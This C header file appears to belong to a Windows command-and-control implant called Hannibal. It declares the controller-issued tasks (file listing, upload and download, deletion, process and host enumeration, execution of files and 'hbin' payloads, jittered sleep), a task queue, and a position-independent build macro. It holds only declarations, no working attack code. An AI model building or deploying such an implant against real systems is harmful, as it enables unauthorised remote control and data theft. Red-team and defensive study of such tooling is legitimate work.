#ifndef HANNIBAL_TASKING_H
#define HANNIBAL_TASKING_H

#include <windows.h>
#include "hannibal.h"
#include "utility_strings.h"
#include "utility_serialization.h"


#define TASK_CIRCULAR_QUEUE_SIZE 10
#define TASK_RESPONSE_CIRCULAR_QUEUE_SIZE 10

#ifdef PIC_BUILD
#define FUNC_OFFSET( x ) ((UINT_PTR)StRipStart() + (DWORD)&x)
#else
#define FUNC_OFFSET( x ) (&x)
#endif


/////////////////////// Task CMDs

// Network message encodings

#ifdef INCLUDE_CMD_LS
#define CMD_LS_MESSAGE 1
#endif

#ifdef INCLUDE_CMD_EXIT
#define CMD_EXIT_MESSAGE 2
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
#define CMD_DOWNLOAD_MESSAGE 3
#endif

#ifdef INCLUDE_CMD_UPLOAD
#define CMD_UPLOAD_MESSAGE 4
#endif

#ifdef INCLUDE_CMD_EXECUTE_HBIN
#define CMD_EXECUTE_HBIN_MESSAGE 5
#endif

#ifdef INCLUDE_CMD_RM
#define CMD_RM_MESSAGE 6
#endif

#ifdef INCLUDE_CMD_PWD
#define CMD_PWD_MESSAGE 7
#endif

#ifdef INCLUDE_CMD_CD
#define CMD_CD_MESSAGE 8
#endif

#ifdef INCLUDE_CMD_CP
#define CMD_CP_MESSAGE 9
#endif

#ifdef INCLUDE_CMD_MV
#define CMD_MV_MESSAGE 10
#endif

#ifdef INCLUDE_CMD_HOSTNAME
#define CMD_HOSTNAME_MESSAGE 11
#endif

#ifdef INCLUDE_CMD_WHOAMI
#define CMD_WHOAMI_MESSAGE 12
#endif

#ifdef INCLUDE_CMD_MKDIR
#define CMD_MKDIR_MESSAGE 13
#endif

#ifdef INCLUDE_CMD_PS
#define CMD_PS_MESSAGE 14
#endif

#ifdef INCLUDE_CMD_IPINFO
#define CMD_IPINFO_MESSAGE 15
#endif

#ifdef INCLUDE_CMD_LISTDRIVES
#define CMD_LISTDRIVES_MESSAGE 16
#endif

#ifdef INCLUDE_CMD_EXECUTE
#define CMD_EXECUTE_MESSAGE 17
#endif

#ifdef INCLUDE_CMD_SLEEP
#define CMD_SLEEP_MESSAGE 18
#endif

#ifdef INCLUDE_CMD_AGENTINFO
#define CMD_AGENTINFO_MESSAGE 19
#endif

// Typedefs used to pass args to its respective cmd

#ifdef INCLUDE_CMD_LS
typedef struct _CMD_LS {
    LPCWSTR path;
} CMD_LS;
#endif

#ifdef INCLUDE_CMD_EXIT
typedef struct _CMD_EXIT {
    int type; // 0 - Process, 1 - Current Thread
} CMD_EXIT;
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
typedef struct _CMD_DOWNLOAD { // Agent > Controller
     LPCWSTR path;
} CMD_DOWNLOAD;
#endif

#ifdef INCLUDE_CMD_EXECUTE_HBIN
typedef struct _CMD_EXECUTE_HBIN { // Agent > Controller
     LPVOID args;
     int arg_size;
     LPVOID hbin;
     int hbin_size;
} CMD_EXECUTE_HBIN;
#endif

#ifdef INCLUDE_CMD_RM
typedef struct _CMD_RM {
    LPCWSTR path;
} CMD_RM;
#endif

#ifdef INCLUDE_CMD_PWD
typedef struct _CMD_PWD {
    // Takes no args
} CMD_PWD;
#endif

#ifdef INCLUDE_CMD_CD
typedef struct _CMD_CD {
    LPCWSTR path;
} CMD_CD;
#endif

#ifdef INCLUDE_CMD_CP
typedef struct _CMD_CP {
    LPCWSTR src_path;
    LPCWSTR dst_path;
} CMD_CP;
#endif

#ifdef INCLUDE_CMD_MV
typedef struct _CMD_MV {
    LPCWSTR src_path;
    LPCWSTR dst_path;
} CMD_MV;
#endif

#ifdef INCLUDE_CMD_HOSTNAME
typedef struct _CMD_HOSTNAME {
    // Takes no args
} CMD_HOSTNAME;
#endif

#ifdef INCLUDE_CMD_WHOAMI
typedef struct _CMD_WHOAMI {
    // Takes no args
} CMD_WHOAMI;
#endif

#ifdef INCLUDE_CMD_MKDIR
typedef struct _CMD_MKDIR {
    LPCWSTR path;
} CMD_MKDIR;
#endif

#ifdef INCLUDE_CMD_PS
typedef struct _CMD_PS {
    // Takes no args
} CMD_PS;
#endif

#ifdef INCLUDE_CMD_IPINFO
typedef struct _CMD_IPINFO {
    // Takes no args
} CMD_IPINFO;
#endif

#ifdef INCLUDE_CMD_LISTDRIVES
typedef struct _CMD_LISTDRIVES {
    // Takes no args
} CMD_LISTDRIVES;
#endif

#ifdef INCLUDE_CMD_EXECUTE
typedef struct _CMD_EXECUTE {
    LPCWSTR path;
} CMD_EXECUTE;
#endif

#ifdef INCLUDE_CMD_SLEEP
typedef struct _CMD_SLEEP {
    UINT32 interval;
    UINT32 jitter;
} CMD_SLEEP;
#endif

#ifdef INCLUDE_CMD_AGENTINFO
typedef struct _CMD_AGENTINFO {
    // Takes no args
} CMD_AGENTINFO;
#endif


/////////////////////// Task Structures


typedef struct _TASK {
    char *task_uuid; // Tracking on the controller
    int cmd_id; // Identify specific function to execute
    int timestamp;
    void *cmd;
    LPCSTR output;
    int output_size;
} TASK, *PTASK;

typedef struct _TASK_QUEUE {
    int front;
    int rear;
    int size; // How many tasks in queue
    int capacity; // How many tasks can it hold
    TASK *queue_ptr;
} TASK_QUEUE, *PTASK_QUEUE;

typedef struct _TASK_ENTRY {
    int cmd_id;
    (*cmd_ptr)(TASK t);
} TASK_ENTRY;


void init_task_ptrs();
BOOL init_task_queue(TASK_QUEUE *queue_ptr, int capacity);
BOOL init_task_response_queue(TASK_QUEUE *queue_ptr, int capacity);
BOOL task_enqueue(TASK_QUEUE *queue_struct, TASK *TASK);
BOOL task_dequeue(TASK_QUEUE *queue_struct, TASK *TASK);
void hannibal_response(LPCWSTR message, LPCSTR task_uuid);

///////////////////////////////////////////////////// CMD Defs

#ifdef INCLUDE_CMD_LS
void format_time(SYSTEMTIME *st, WCHAR *buffer);
void format_size(ULONGLONG size, WCHAR *buffer);
void append_to_buffer(WCHAR *buffer, int *cursor, const WCHAR *str);
// void format_unix_time(SYSTEMTIME *st, WCHAR *buffer);
#endif

#ifdef INCLUDE_CMD_RM
int contains_wildcard(LPCWSTR path);
void delete_files_by_pattern(LPCWSTR directory, LPCWSTR pattern);
#endif

#ifdef INCLUDE_CMD_CP
void copy_directory(LPCWSTR sourceDir, LPCWSTR destDir);
#endif


// Add your forward declaration here and add an entry in init_task_ptrs() (hannibal_tasking.c)

#ifdef INCLUDE_CMD_LS
void cmd_ls(TASK t);
#endif

#ifdef INCLUDE_CMD_EXIT
void cmd_exit(TASK t);
#endif

#ifdef INCLUDE_CMD_EXECUTE_HBIN
void cmd_execute_hbin(TASK t);
#endif

#ifdef INCLUDE_CMD_RM
void cmd_rm(TASK t);
#endif

#ifdef INCLUDE_CMD_PWD
void cmd_pwd(TASK t);
#endif

#ifdef INCLUDE_CMD_CD
void cmd_cd(TASK t);
#endif

#ifdef INCLUDE_CMD_CP
void cmd_cp(TASK t);
#endif

#ifdef INCLUDE_CMD_MV
void cmd_mv(TASK t);
#endif

#ifdef INCLUDE_CMD_HOSTNAME
void cmd_hostname(TASK t);
#endif

#ifdef INCLUDE_CMD_WHOAMI
void cmd_whoami(TASK t);
#endif

#ifdef INCLUDE_CMD_MKDIR
void cmd_mkdir(TASK t);
#endif

#ifdef INCLUDE_CMD_PS
void cmd_ps(TASK t);
#endif

#ifdef INCLUDE_CMD_IPINFO
void cmd_ipinfo(TASK t);
#endif

#ifdef INCLUDE_CMD_LISTDRIVES
void cmd_listdrives(TASK t);
#endif

#ifdef INCLUDE_CMD_EXECUTE
void cmd_execute(TASK t);
#endif

#ifdef INCLUDE_CMD_SLEEP
void cmd_sleep(TASK t);
#endif

#ifdef INCLUDE_CMD_AGENTINFO
void cmd_agentinfo(TASK t);
#endif


#endif